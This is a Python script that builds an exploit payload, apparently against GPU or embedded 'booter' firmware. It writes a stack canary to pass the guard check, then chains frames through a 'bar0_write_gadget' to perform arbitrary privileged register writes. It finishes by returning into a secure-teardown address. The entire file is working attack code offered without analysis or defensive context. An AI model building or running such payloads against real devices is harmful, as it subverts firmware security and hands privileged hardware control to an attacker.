import struct
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from common.constants import get

MAILBOX_REG = get('payload_registers.mailbox_diagnostic.addr')
MAILBOX_VALUE = get('payload_registers.mailbox_diagnostic.value')

WRITES = [
    (0x009A0204, 0x02779000),
    (0x00100CE0, 0x0000020B),
    (0x00823804, 0xFFFFFFFF),
    (MAILBOX_REG, MAILBOX_VALUE),
]


def build() -> bytes:
    payload_size = get('dmem_layout.payload_size')
    dma_target = get('dmem_layout.dma_target')
    canary = get('dmem_layout.canary')
    canary_addr = get('dmem_layout.guard_addr')
    frame_start = get('payload_frames.frame_start_addr')
    frame_stride = get('payload_frames.frame_stride')
    gadget_addr = get('booter_addrs.bar0_write_gadget')
    tail_return = get('booter_addrs.tail_exit_secure_teardown')

    payload = bytearray(payload_size)

    def w32(dmem_addr: int, val: int) -> None:
        off = dmem_addr - dma_target
        if 0 <= off <= len(payload) - 4:
            struct.pack_into("<I", payload, off, val & 0xFFFFFFFF)

    w32(canary_addr, canary)

    a = frame_start
    for addr, val in WRITES:
        w32(a + get('payload_frames.frame_field_offsets.r0'), canary_addr)
        w32(a + get('payload_frames.frame_field_offsets.r1'), 0x00000000)
        w32(a + get('payload_frames.frame_field_offsets.r2'), val)
        w32(a + get('payload_frames.frame_field_offsets.r3'), addr)
        w32(a + get('payload_frames.frame_field_offsets.saved_reg'), canary)
        w32(a + get('payload_frames.frame_field_offsets.return_addr'), gadget_addr)
        a += frame_stride

    w32(a + get('payload_frames.frame_field_offsets.r0'), 0x00000000)
    w32(a + get('payload_frames.frame_field_offsets.r1'), 0x00000000)
    w32(a + get('payload_frames.frame_field_offsets.r2'), 0x00000000)
    w32(a + get('payload_frames.frame_field_offsets.r3'), 0x00000000)
    w32(a + get('payload_frames.frame_field_offsets.saved_reg'), canary)
    w32(a + get('payload_frames.frame_field_offsets.return_addr'), tail_return)

    return bytes(payload)
